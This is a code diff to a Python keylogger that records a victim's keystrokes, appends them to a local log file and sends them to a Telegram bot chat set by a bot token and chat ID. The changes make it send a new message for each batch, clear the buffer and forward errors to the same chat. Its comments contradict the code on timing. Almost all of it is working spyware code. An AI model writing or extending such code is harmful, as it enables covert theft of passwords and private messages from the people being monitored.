@@ -44,16 +44,21 @@ def keyPressed(key):
         else:
             key_data += f'[{key}]'  # Record other special keys
 
-
-# Function to save data to a file every 3 seconds and update the Telegram message
+# Function to save data to a file every 5 seconds and send a new Telegram message
 def save_data():
     global key_data
     bot = telebot.TeleBot(os.getenv('BOT_TOKEN'))  # Get bot token from .env
     chat_id = os.getenv('CHAT_ID')  # Get chat ID from .env
 
     # Send initial message about the start of the program
-    initial_message = bot.send_message(chat_id, "Program started. Nothing typed.")
-    message_id = initial_message.message_id  # Message ID for editing
+    bot.send_message(chat_id, "<b>Program started. Nothing typed.\n\n\n❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️"
+                              "️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤"
+                              "️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤"
+                              "️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤"
+                              "️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤"
+                              "️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤"
+                              "️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤"
+                              "❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️️</b>", parse_mode="HTML")
 
     while True:
         try:
@@ -67,14 +72,19 @@ def save_data():
                 # Message about the detected language
                 language_message = f"Language: {language}"
 
-                # Update the message with the new text
-                bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=f"Program started.\n{language_message}\n" + key_data)
-                with open(keyfile_path, 'a') as logKey:
-                    logKey.write(key_data)  # Add to the file
-            time.sleep(3)  # Delay of 3 seconds
-        except Exception as e:
-            pass
+                # Send a new message with the text
+                bot.send_message(chat_id, f"Program started.\n{language_message}\n" + key_data)
 
+                # Save the data to the file
+                with open(keyfile_path, 'a') as logKey:
+                    logKey.write(key_data)
+
+                # Clear the stored key data after sending
+                key_data = ""
+
+            time.sleep(20)  # Delay of 60 seconds
+        except Exception as e:
+            bot.send_message(chat_id, f"Error: {e}") # Catch error
 
 # Clear the file at the start of the program
 if os.path.exists(keyfile_path):
@@ -87,7 +97,6 @@ if os.path.exists(keyfile_path):
         text_form_doc = logKey.read()
 else:
     text_form_doc = ""
-
 
 # If the file is not empty, send its content, otherwise inform about the emptiness
 if text_form_doc:
